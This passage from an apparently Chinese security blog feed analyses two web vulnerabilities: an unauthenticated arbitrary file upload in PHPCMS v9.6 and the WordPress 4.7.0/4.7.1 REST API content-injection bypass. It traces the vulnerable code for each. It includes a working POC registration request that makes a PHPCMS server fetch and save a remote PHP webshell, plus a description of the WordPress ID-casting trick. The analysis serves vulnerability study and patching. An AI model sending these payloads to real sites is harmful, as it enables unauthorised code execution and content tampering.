class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($matches[<span class="number">3</span>] <span class="keyword">as</span> $matche)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(strpos($matche, <span class="string">'://'</span>) === <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">dir_create($uploaddir);</span><br><span class="line">$remotefileurls[$matche] = <span class="keyword">$this</span>-&gt;fillurl($matche, $absurl, $basehref);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>$matches[3]</code>就是<code>http://127.0.0.1/shell.txt.php.jpg</code></p><p>又经过了<code>fillurl</code>方法的处理，跟进去看一下，看到关键的地方：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$BaseUrlPath = preg_replace(<span class="string">"/\/([^\/]*)\.(.*)$/"</span>,<span class="string">'/'</span>,$BaseUrlPath);</span><br><span class="line">$BaseUrlPath = preg_replace(<span class="string">"/\/$/"</span>,<span class="string">''</span>,$BaseUrlPath);</span><br><span class="line">$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line"><span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br></pre></td></tr></table></figure><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/phpcms2.png" alt="phpcms2"></p><p><code>$BaseUrlPath=&#39;/127.0.0.1/shell.txt.php.jpg&#39;</code></p><p>下一个正则将<code>/</code>去掉，以方便后面的操作：</p><p><code>$BaseUrlPath=&#39;127.0.0.1shell.txt.php.jpg&#39;</code></p><p>接下来看到对于url进行了一个关键的处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$pos = strpos($surl,<span class="string">'#'</span>);</span><br><span class="line"><span class="keyword">if</span>($pos&gt;<span class="number">0</span>) $surl = substr($surl,<span class="number">0</span>,$pos);</span><br></pre></td></tr></table></figure><p>也就是说如果我们构造一个类似于<code>http://127.0.0.1/shell.txt.php#.jpg</code></p><p>再对url进行重组后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">$preurl = strtolower(substr($surl,<span class="number">0</span>,<span class="number">6</span>));</span><br><span class="line"><span class="keyword">if</span>(strlen($surl)&lt;<span class="number">7</span>)</span><br><span class="line">$okurl = <span class="string">'http://'</span>.$BaseUrlPath.<span class="string">'/'</span>.$surl;</span><br><span class="line"><span class="keyword">elseif</span>($preurl==<span class="string">"http:/"</span>||$preurl==<span class="string">'ftp://'</span> ||$preurl==<span class="string">'mms://'</span> || $preurl==<span class="string">"rtsp://"</span> || $preurl==<span class="string">'thunde'</span> || $preurl==<span class="string">'emule:'</span>|| $preurl==<span class="string">'ed2k:/'</span>)</span><br><span class="line">$okurl = $surl;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">$okurl = <span class="string">'http://'</span>.$BaseUrlPath.<span class="string">'/'</span>.$surl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后返回的<code>$surl=http://127.0.0.1/shell.txt.php</code>并且同时满足前面对于后缀名的限制。</p><p>回到<code>download</code>方法中，接下来的操作对文件名进行了重组：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($remotefileurls <span class="keyword">as</span> $k=&gt;$file) &#123;</span><br><span class="line"><span class="keyword">if</span>(strpos($file, <span class="string">'://'</span>) === <span class="keyword">false</span> || strpos($file, $upload_url) !== <span class="keyword">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">$filename = fileext($file);</span><br><span class="line">$file_name = basename($file);</span><br><span class="line">$filename = <span class="keyword">$this</span>-&gt;getname($filename);</span><br><span class="line"></span><br><span class="line">$newfile = $uploaddir.$filename;</span><br></pre></td></tr></table></figure><p>首先在这里截取最后一个<code>.</code>之后的后缀作为后缀名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fileext</span><span class="params">($filename)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> strtolower(trim(substr(strrchr($filename, <span class="string">'.'</span>), <span class="number">1</span>, <span class="number">10</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终的文件名就变成了<code>.php</code>结尾的文件。</p><p>之后，<code>$upload_func = $this-&gt;upload_func;</code>，而<code>$this-&gt;upload_func = &#39;copy&#39;;</code>。即调用<code>copy</code>方法进行远程文件下载。</p><h3 id="2-上传路径部分"><a href="#2-上传路径部分" class="headerlink" title="2. 上传路径部分"></a>2. 上传路径部分</h3><p>看一下我们上传的文件的命名情况：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getname</span><span class="params">($fileext)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> date(<span class="string">'Ymdhis'</span>).rand(<span class="number">100</span>, <span class="number">999</span>).<span class="string">'.'</span>.$fileext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上传的路径：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uploadpath = $upload_url.$dir;</span><br></pre></td></tr></table></figure><p>而</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'upload_path'</span> =&gt; PHPCMS_PATH.<span class="string">'uploadfile/'</span>,</span><br></pre></td></tr></table></figure><p>上传路径就是<code>uploadfile/年月日时间具体到秒+3位100-999的随机数+文件后缀</code></p><p>这样看，其实可以直接写脚本对文件名进行枚举。</p><p>有没有更简单的方法呢？有。</p><p>回到<code>register</code>方法中，向下看：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(pc_base::load_config(<span class="string">'system'</span>, <span class="string">'phpsso'</span>)) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_init_phpsso();</span><br><span class="line">$status = <span class="keyword">$this</span>-&gt;client-&gt;ps_member_register($userinfo[<span class="string">'username'</span>], $userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'email'</span>], $userinfo[<span class="string">'regip'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line"><span class="keyword">if</span>($status &gt; <span class="number">0</span>) &#123;</span><br><span class="line">$userinfo[<span class="string">'phpssouid'</span>] = $status;</span><br><span class="line"><span class="comment">//传入phpsso为明文密码，加密后存入phpcms_v9</span></span><br><span class="line">$password = $userinfo[<span class="string">'password'</span>];</span><br><span class="line">$userinfo[<span class="string">'password'</span>] = password($userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line">$userid = <span class="keyword">$this</span>-&gt;db-&gt;insert($userinfo, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;<span class="comment">//如果开启选择模型</span></span><br><span class="line">$user_model_info[<span class="string">'userid'</span>] = $userid;</span><br><span class="line"><span class="comment">//插入会员模型数据</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;set_model($userinfo[<span class="string">'modelid'</span>]);</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;insert($user_model_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是说会将<code>$userid</code>加入<code>$user_model_info</code>数组中再进行数据库的插入操作（会员新增操作，对应的v9_member_detail数据表）:</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/phpcms3.png" alt="phpcms3"></p><p>只有两个字段，<code>userid</code>与<code>birthday</code>。但由于$user_model_info数组已经包含了我们之前构造提交的info[content]=xxxxxx的内容，而在插入数据库的时候又没有content字段，所以会导致数据库报错，从而将我们构造的xxxxxx的内容给回显出来，所以就不用暴力去破解文件名了。</p><h3 id="3-POC解释"><a href="#3-POC解释" class="headerlink" title="3. POC解释"></a>3. POC解释</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">siteid=1&amp;modelid=1&amp;username=123456&amp;password=123456&amp;email=123456@qq.com&amp;info[content]=&lt;img src=http://127.0.0.1/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=</span><br></pre></td></tr></table></figure><p>?后的<code>.php</code>被当做shell.txt的参数，所以复制的是shell.txt的内容。</p><h1 id="0x03-diff比较"><a href="#0x03-diff比较" class="headerlink" title="0x03 diff比较"></a>0x03 diff比较</h1><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/phpcms4.png" alt="phpcms4"></p><p>简单粗暴的对处理后的文件后缀进行检测。</p><h1 id="0x04-修补方案"><a href="#0x04-修补方案" class="headerlink" title="0x04 修补方案"></a>0x04 修补方案</h1><p>更新吧</p><h1 id="0x05-最后吐槽一句"><a href="#0x05-最后吐槽一句" class="headerlink" title="0x05 最后吐槽一句"></a>0x05 最后吐槽一句</h1><p>顺便把phpcms的源码看了一下，发现phpcms对于安全性的验证真的是简单粗暴，只要是个交互的地方就要调一遍过滤函数，这样死板的做法，可能在安全上会有一些益处，但是势必会对以后的扩展造成阻碍。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-漏洞简述&quot;&gt;&lt;a href=&quot;#0x00-漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简述&quot;&gt;&lt;/a&gt;0x00 漏洞简述&lt;/h1&gt;&lt;h2 id=&quot;1-漏洞简介&quot;&gt;&lt;a href=&quot;#1-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;1. 漏洞简介&quot;&gt;&lt;/a&gt;1. 漏洞简介&lt;/h2&gt;&lt;p&gt;上周phpcms v9.6的任意文件上传的漏洞，已经潜伏半年多的一个漏洞。该漏洞可以在用户注册界面以未授权的情况下实现任意文件上传。&lt;/p&gt;
&lt;h2 id=&quot;2-漏洞影响版本&quot;&gt;&lt;a href=&quot;#2-漏洞影响版本&quot; class=&quot;headerlink&quot; title=&quot;2. 漏洞影响版本&quot;&gt;&lt;/a&gt;2. 漏洞影响版本&lt;/h2&gt;&lt;p&gt;phpcms v9.6&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>WordPress REST API 内容注入</title>
    <link href="https://lucifaer.com/2017/02/06/WordPress%20REST%20API%20%E5%86%85%E5%AE%B9%E6%B3%A8%E5%85%A5/"/>
    <id>https://lucifaer.com/2017/02/06/WordPress REST API 内容注入/</id>
    <published>2017-02-06T10:44:09.000Z</published>
    <updated>2018-11-29T09:34:45.071Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-漏洞简述"><a href="#0x00-漏洞简述" class="headerlink" title="0x00 漏洞简述"></a>0x00 漏洞简述</h1><h2 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1. 漏洞简介"></a>1. 漏洞简介</h2><p>在<code>REST API</code>自动包含在<code>Wordpress4.7</code>以上的版本，<code>WordPress REST API</code>提供了一组易于使用的HTTP端点，可以使用户以简单的JSON格式访问网站的数据，包括用户，帖子，分类等。检索或更新数据与发送HTTP请求一样简单。上周，一个由<code>REST API</code>引起的影响<code>WorePress4.7.0</code>和<code>4.7.1</code>版本的漏洞被披露，该漏洞可以导致WordPress所有文章内容可以未经验证被查看，修改，删除，甚至创建新的文章，危害巨大。</p><h2 id="2-漏洞影响版本"><a href="#2-漏洞影响版本" class="headerlink" title="2. 漏洞影响版本"></a>2. 漏洞影响版本</h2><ul><li>WordPress4.7.0</li><li>WordPress4.7.1</li></ul><a id="more"></a><h1 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h1><p><a href="https://www.seebug.org/vuldb/ssvid-92637" target="_blank" rel="noopener">Seebug</a>上已经给出详细的复现过程，在复现过程中可以使用<a href="https://www.exploit-db.com/exploits/41223/" target="_blank" rel="noopener">已经放出的POC</a>来进行测试。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><p>其实漏洞发现者已经给出了较为详细的<a href="https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html" target="_blank" rel="noopener">分析过程</a>，接下来说说自己在参考了上面的分析后的一点想法。</p><h2 id="WP-REST-API"><a href="#WP-REST-API" class="headerlink" title="WP REST API"></a>WP REST API</h2><p>首先来说一下<code>REST API</code>。</p><h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><p><code>WP-API</code>中采用了控制器概念，为表示自愿端点的类提供了标准模式，所有资源端点都扩展<code>WP_REST_Controller</code>来保证其实现通用方法。</p><h3 id="五种请求"><a href="#五种请求" class="headerlink" title="五种请求"></a>五种请求</h3><p>之后，<code>WP-API</code>还有这么几种请求（也可以想成是功能吧）：</p><ul><li>HEAD</li><li>GET</li><li>POST</li><li>PUT</li><li>DELETE</li></ul><p>以上表示HTTP客户端可能对资源执行的操作类型。</p><h3 id="HTTP客户端"><a href="#HTTP客户端" class="headerlink" title="HTTP客户端"></a>HTTP客户端</h3><p>WordPress本身在<code>WP_HTTP</code>类和相关函数中提供了一个HTTP客户端。用于从另一个访问一个WordPress站点。</p><h3 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h3><p>简单来说，就是文章，页面，评论等。</p><p><code>WP-API</code>允许HTTP客户端对资源执行CRUD操作（创建，读取，更新，删除，这边只展示和漏洞相关的部分）：</p><ul><li><p><code>GET /wp-json/wp/v2/posts</code>获取帖子的集合：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045885475349.jpg" alt=""></p></li><li><p><code>GET /wp-json/wp/v2/posts/1</code>获取一个ID为1的单独的Post：</p><p>  <img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045885751013.jpg" alt=""></p></li></ul><p>可以看到ID为1的文章标题为Hello World，包括文章的路由也有。</p><h3 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h3><p>路由是用于访问端点的“名称”，在URL中使用（在非法情况下可控，就像这个漏洞一样）。</p><p>例如，使用URL<code>http://example.com/wp-json/wp/v2/posts/123</code>:</p><ul><li>路由（route）是<code>wp/v2/posts/123</code>，不包括<code>wp-json</code>，因为<code>wp-json</code>是API本身的基本路径。</li><li>这个路由有三个端点：<ul><li>GET触发一个<code>get_item</code>方法，将post数据返回给客户端。</li><li>PUT触发一个<code>update_item</code>方法，使数据更新，并返回更新的发布数据。</li><li>DELETE触发<code>delete_item</code>方法，将现在删除的发布数据返回给客户端。</li></ul></li></ul><h2 id="静态追踪"><a href="#静态追踪" class="headerlink" title="静态追踪"></a>静态追踪</h2><p>知道了<code>WP-API</code>的路由信息以及其操作方式，可以根据其运行的思路来看一下具体实现的代码。</p><p>我们看一下<code>/wp-includes/rest-api/endpoints/class-wp-rest-post-controller.php</code>：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045885995846.jpg" alt=""></p><p>根据上面的信息，我们可以知道这是注册controller对象的路由，实现路由中端点方法。</p><p>在这里，如果我们向<code>/wp-json/wp/v2/posts/1</code>发送请求，则ID参数将被设置为1：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045886320123.jpg" alt=""></p><p>同时，注意一下这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">register_rest_route( <span class="keyword">$this</span>-&gt;namespace, <span class="string">'/'</span> . <span class="keyword">$this</span>-&gt;rest_base . <span class="string">'/(?P&lt;id&gt;[\d]+)'</span>, <span class="keyword">array</span>(</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">'methods'</span>             =&gt; WP_REST_Server::READABLE,</span><br><span class="line"><span class="string">'callback'</span>            =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'get_item'</span> ),</span><br><span class="line"><span class="string">'permission_callback'</span> =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'get_item_permissions_check'</span> ),</span><br><span class="line"><span class="string">'args'</span>                =&gt; $get_item_args,</span><br><span class="line">),</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">'methods'</span>             =&gt; WP_REST_Server::EDITABLE,</span><br><span class="line"><span class="string">'callback'</span>            =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'update_item'</span> ),</span><br><span class="line"><span class="string">'permission_callback'</span> =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'update_item_permissions_check'</span> ),</span><br><span class="line"><span class="string">'args'</span>                =&gt; <span class="keyword">$this</span>-&gt;get_endpoint_args_for_item_schema( WP_REST_Server::EDITABLE ),</span><br><span class="line">),</span><br><span class="line"><span class="keyword">array</span>(</span><br><span class="line"><span class="string">'methods'</span>             =&gt; WP_REST_Server::DELETABLE,</span><br><span class="line"><span class="string">'callback'</span>            =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'delete_item'</span> ),</span><br><span class="line"><span class="string">'permission_callback'</span> =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'delete_item_permissions_check'</span> ),</span><br><span class="line"><span class="string">'args'</span>                =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'force'</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'type'</span>        =&gt; <span class="string">'boolean'</span>,</span><br><span class="line"><span class="string">'default'</span>     =&gt; <span class="keyword">false</span>,</span><br><span class="line"><span class="string">'description'</span> =&gt; __( <span class="string">'Whether to bypass trash and force deletion.'</span> ),</span><br><span class="line">),</span><br><span class="line">),</span><br><span class="line">),</span><br><span class="line"><span class="string">'schema'</span> =&gt; <span class="keyword">array</span>( <span class="keyword">$this</span>, <span class="string">'get_public_item_schema'</span> ),</span><br><span class="line">) );</span><br></pre></td></tr></table></figure><p>可以看到在<code>register_rest_route</code>中对路由进行了正则限制：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045886830428.jpg" alt=""></p><p>也就是防止攻击者恶意构造ID值，但是我们可以发现<code>$_GET</code>和<code>$_POST</code>值优先于路由正则表达式生成的值：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045887045836.jpg" alt=""></p><p>这边没有找到ID为<code>123hh</code>的项目，所以返回<code>rest_invalid</code>。</p><p>现在我们可以忽略路由正则的限制，来传入我们自定义的ID。</p><p>接下来在审查各个端点方法中，找到了<code>update_item</code>这个方法，及其权限检查方法<code>update_item_permissions_check</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_item_permissions_check</span><span class="params">( $request )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">$post = get_post( $request[<span class="string">'id'</span>] );</span><br><span class="line">$post_type = get_post_type_object( <span class="keyword">$this</span>-&gt;post_type );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $post &amp;&amp; ! <span class="keyword">$this</span>-&gt;check_update_permission( $post ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_cannot_edit'</span>, __( <span class="string">'Sorry, you are not allowed to edit this post.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; rest_authorization_required_code() ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $request[<span class="string">'author'</span>] ) &amp;&amp; get_current_user_id() !== $request[<span class="string">'author'</span>] &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_cannot_edit_others'</span>, __( <span class="string">'Sorry, you are not allowed to update posts as this user.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; rest_authorization_required_code() ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">empty</span>( $request[<span class="string">'sticky'</span>] ) &amp;&amp; ! current_user_can( $post_type-&gt;cap-&gt;edit_others_posts ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_cannot_assign_sticky'</span>, __( <span class="string">'Sorry, you are not allowed to make posts sticky.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; rest_authorization_required_code() ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! <span class="keyword">$this</span>-&gt;check_assign_terms_permission( $request ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_cannot_assign_term'</span>, __( <span class="string">'Sorry, you are not allowed to assign the provided terms.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; rest_authorization_required_code() ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，此函数通过检查文章是否实际存在，以及我们的用户是否有权限编辑这边文章来验证请求。但是当我们发送一个没有响应文章的ID时，就可以通过权限检查，并允许继续执行对<code>update_item</code>方法的请求。</p><p>具体到代码，就是让<code>$post</code>为空，就可以通过权限检查，接下来跟进<code>get_post</code>方法中看一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_post</span><span class="params">( $post = null, $output = OBJECT, $filter = <span class="string">'raw'</span> )</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $post ) &amp;&amp; <span class="keyword">isset</span>( $GLOBALS[<span class="string">'post'</span>] ) )</span><br><span class="line">$post = $GLOBALS[<span class="string">'post'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $post <span class="keyword">instanceof</span> WP_Post ) &#123;</span><br><span class="line">$_post = $post;</span><br><span class="line">&#125; <span class="keyword">elseif</span> ( is_object( $post ) ) &#123;</span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $post-&gt;filter ) ) &#123;</span><br><span class="line">$_post = sanitize_post( $post, <span class="string">'raw'</span> );</span><br><span class="line">$_post = <span class="keyword">new</span> WP_Post( $_post );</span><br><span class="line">&#125; <span class="keyword">elseif</span> ( <span class="string">'raw'</span> == $post-&gt;filter ) &#123;</span><br><span class="line">$_post = <span class="keyword">new</span> WP_Post( $post );</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$_post = WP_Post::get_instance( $post-&gt;ID );</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$_post = WP_Post::get_instance( $post );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! $_post )</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure><p>从代码中可以看出，它是用<code>wp_posts</code>中的<code>get_instance</code>静态方法来获取文章的，跟进<code>wp_posts</code>类，位于<code>/wp-includes/class-wp-post.php</code>中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_instance</span><span class="params">( $post_id )</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $wpdb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! is_numeric( $post_id ) || $post_id != floor( $post_id ) || ! $post_id ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，当我们传入的ID不是全由数字字符组成的时候，就会返回false，也就是返回一个不存在的文章。从而<code>get_post</code>方法返回null，从而绕过<code>update_item_permissions_check</code>的权限检测。</p><p>回头再看一下可执行方法<code>upload_item</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_item</span><span class="params">( $request )</span> </span>&#123;</span><br><span class="line">$id   = (int) $request[<span class="string">'id'</span>];</span><br><span class="line">$post = get_post( $id );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="keyword">empty</span>( $id ) || <span class="keyword">empty</span>( $post-&gt;ID ) || <span class="keyword">$this</span>-&gt;post_type !== $post-&gt;post_type ) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> WP_Error( <span class="string">'rest_post_invalid_id'</span>, __( <span class="string">'Invalid post ID.'</span> ), <span class="keyword">array</span>( <span class="string">'status'</span> =&gt; <span class="number">404</span> ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$post = <span class="keyword">$this</span>-&gt;prepare_item_for_database( $request );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( is_wp_error( $post ) ) &#123;</span><br><span class="line"><span class="keyword">return</span> $post;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// convert the post object to an array, otherwise wp_update_post will expect non-escaped input.</span></span><br><span class="line">$post_id = wp_update_post( wp_slash( (<span class="keyword">array</span>) $post ), <span class="keyword">true</span> );</span><br></pre></td></tr></table></figure><p>在这边将ID参数装换为一个整数，然后传递给<code>get_post</code>。而PHP类型转换的时候回出现这样的情况：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15045887374640.jpg" alt=""></p><p>所以，也就是说，当攻击者发起<code>/wp-json/wp/v2/posts/1?id=1hhh</code>请求时，便是发起了对ID为1的文章的请求。下面为利用<a href="https://www.exploit-db.com/exploits/41223/" target="_blank" rel="noopener">exploit-db</a>上的POC来进行测试：</p><ul><li><p>新建文章：</p><p>  <img 